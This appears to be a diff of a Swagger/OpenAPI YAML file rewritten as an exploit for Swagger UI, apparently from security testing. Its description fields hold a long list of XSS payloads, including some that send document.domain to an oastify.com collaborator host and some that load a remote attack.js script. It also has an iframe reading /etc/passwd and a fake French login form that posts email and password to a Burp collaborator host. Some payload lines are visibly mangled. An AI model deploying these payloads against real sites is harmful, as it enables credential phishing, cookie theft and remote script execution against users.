@@ -1,66 +1,87 @@
+---
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: >
-    Ceci est l'ancienne documentation de l'API, retrouvez la nouvelle version
-<a href="https://evil.com">ici</a> <a href="javascript:alert(1);">test</a>
+  description: |
+<img src=x oNlY=1 oNerror=alert('xxs')//
+<img src=x on onerror=alert()>
+<Svg Only=1 OnLoad=confirm(1)>
+<svg onload=%0Aalert'1'>
+<svg/onload=location/**/=’https://lazq8t9jrxsvr895pugyavhuclic631rq.oastify.com/’+document.domain&gt;
+<svg/onload=location/**/=’https://
+    lazq8t9jrxsvr895pugyavhuclic631rq.oastify.com/’+document.domain>
+    “><sVg/OnLuFy=”X=y”oNloaD=;
+    1^confirm(1)>/“^1//
+<svg onload=prompt%26%23x000000028;document.domain)>
+<svg onload=%0Aalert1>
+<svg onload=alert%26%230000000040"1")>
+    %2sscript%2ualert()%2s/script%2u
+<svg on onload=(alert)(document.domain)>
+<svg onload=alert%26%230000000040"")>
+<button/onclick="confirm(document.domain+document.cookie)">CLICK</button>
+<svg onauxclick=(eval)(location.href.split('#')[1])>
+<xhzeem/x=” onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
+<img src=x onerror=a=document;cc=a.createElement('script');cc.src='//lazq8t9jrxsvr895pugyavhuclic631rq.oastify.com/attack.js';a.querySelector('head')append(cc)>
+    «sVg OnPointerEnter= "locaction= lavas + cript:ale + 'rt%2 + '81%2° +9%//</div>
+<iframe src=file:///etc/passwd></iframe>
+<iframe src=https://evil.com></iframe>
+<h1>Connectez vous pour commencer à chatter</h1>
+<form action="https://yourburp.collab.com" method="post">
+<label for="email">Adresse e-mail:</label>
+<input name="email">
+<label for="password">Mot de Passe:</label>
+<input name="password">
+<input type="submit" value="Connexion"></form><!--
   version: production
- 
-basePath: /
+basePath: https://afine.com
 produces:
-  - application/xml
-  - application/json
+- application/xml
+- application/json
 consumes:
-  - application/xml
-  - application/json
+- application/xml
+- application/json
 security:
-  - basicAuth: []
- 
+- basicAuth: []
 paths:
-  /s1rn3tz:
+  "/afine":
     get:
-      summary: this is example text
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - somettext
       operationId: findAccounts
-      tags:
-        - Mathis Pais De Sousa
-      responses:
-        '200':
-          description: No response was specified
- 
-  /exploited_by_s1rn3tz/{id}:
-    delete:
-      summary: swagger
-      operationId: swagger
-      tags:
-        - Swagger UI exploit
-      parameters:
-        - name: id
-          in: path
-          description: >
-<a href="https://s1rn3tz.gitbook.io">blog</a>
-          required: true
-          type: integer
-          format: int64
-      responses:
-        '200':
-          description: No response was specified
- 
-    get:
       summary: this is example text
-      operationId: some_operation
-      tags:
-        - Swagger UI exploit
+  "/malformed_by_afine":
+    delete:
       parameters:
-        - name: id
-          in: path
-          description: this is example text
-          required: true
-          type: integer
-          format: int64
+      - description: |
+<noscript>
+ 
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
       responses:
         '200':
           description: No response was specified
- 
-securityDefinitions:
-  basicAuth:
-    type: basic
+      tags:
+      - afine
+      operationId: afine
+      summary: afine
+    get:
+      parameters:
+      - description: this is example text
+        format: int64
+        in: path
+        name: id
+        required: true
+        type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+      - afine
+      operationId: some_operation
+      summary: this is example text
